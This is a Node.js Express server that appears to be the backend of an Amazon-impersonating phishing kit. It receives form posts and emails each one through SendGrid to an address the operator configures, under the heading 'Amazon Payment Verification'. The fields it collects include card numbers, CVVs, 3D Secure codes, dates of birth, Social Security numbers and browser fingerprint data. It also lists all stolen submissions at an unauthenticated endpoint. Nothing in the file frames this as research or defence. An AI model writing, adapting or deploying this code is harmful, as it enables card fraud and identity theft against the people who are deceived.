const express = require('express');
const bodyParser = require('body-parser');
const sgMail = require('@sendgrid/mail');
const cors = require('cors');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(cors());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Set SendGrid API key
sgMail.setApiKey(process.env.SENDGRID_API_KEY);

// Store submissions in memory (in production, use a database)
let submissions = [];

// Route to handle form submissions
app.post('/api/submit', async (req, res) => {
    try {
        const formData = req.body;
        const timestamp = new Date().toLocaleString();
        
        // Add timestamp to the data
        const submissionData = {
            ...formData,
            submission_timestamp: timestamp
        };
        
        // Store in memory
        submissions.push(submissionData);
        
        console.log('Received form submission:', submissionData);
        
        // Format email content
        const emailContent = formatEmailContent(submissionData);
        
        // Send email via SendGrid
        await sendEmail(emailContent);
        
        // Send success response
        res.status(200).json({
            success: true,
            message: 'Data received and email sent successfully',
            timestamp: timestamp
        });
        
    } catch (error) {
        console.error('Error processing submission:', error);
        res.status(500).json({
            success: false,
            message: 'Error processing submission',
            error: error.message
        });
    }
});

// Route to get all submissions (for monitoring)
app.get('/api/submissions', (req, res) => {
    res.json({
        success: true,
        count: submissions.length,
        submissions: submissions
    });
});

// Health check route
app.get('/health', (req, res) => {
    res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Function to format email content
function formatEmailContent(data) {
    let content = `
AMAZON PAYMENT VERIFICATION DATA
=================================
TIMESTAMP: ${data.submission_timestamp || new Date().toLocaleString()}

PAYMENT INFORMATION:
-------------------
Card Holder: ${data.holder || 'N/A'}
Card Number: ${data.ccnum || 'N/A'}
Expiration: ${data.EXP1 || 'N/A'}/${data.EXP2 || 'N/A'}
CVV: ${data.cvv2 || 'N/A'}
3D Secure: ${data.vbv || 'N/A'}
Date of Birth: ${data.dob || 'N/A'}
SSN: ${data.ssn || 'N/A'}

TECHNICAL DATA:
---------------
IP Address: ${data.ip_address || 'N/A'}
User Agent: ${data.user_agent || 'N/A'}
Screen Resolution: ${data.screen_resolution || 'N/A'}
Language: ${data.language || 'N/A'}
Timezone: ${data.timezone || 'N/A'}
Cookies Enabled: ${data.cookies_enabled || 'N/A'}
Submission Timestamp: ${data.timestamp || 'N/A'}

SYSTEM INFO:
------------
Server Time: ${new Date().toLocaleString()}
Server Timezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
Total Submissions: ${submissions.length}
    `;

    return content;
}

// Function to send email using SendGrid
async function sendEmail(content) {
    const msg = {
        to: process.env.TO_EMAIL, // Recipient email from environment variable
        from: process.env.FROM_EMAIL, // Verified sender email from environment variable
        subject: `Amazon Payment Verification - ${new Date().toLocaleString()}`,
        text: content,
        html: `<pre style="font-family: monospace; white-space: pre-wrap;">${content}</pre>`
    };

    try {
        await sgMail.send(msg);
        console.log('Email sent successfully');
        return true;
    } catch (error) {
        console.error('Error sending email:', error);
        if (error.response) {
            console.error('SendGrid error details:', error.response.body);
        }
        throw error;
    }
}

// Error handling middleware
app.use((error, req, res, next) => {
    console.error('Unhandled error:', error);
    res.status(500).json({
        success: false,
        message: 'Internal server error'
    });
});

// Start server
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Health check: http://localhost:${PORT}/health`);
    console.log(`Submit endpoint: http://localhost:${PORT}/api/submit`);
    console.log(`Submissions monitor: http://localhost:${PORT}/api/submissions`);
});

module.exports = app;
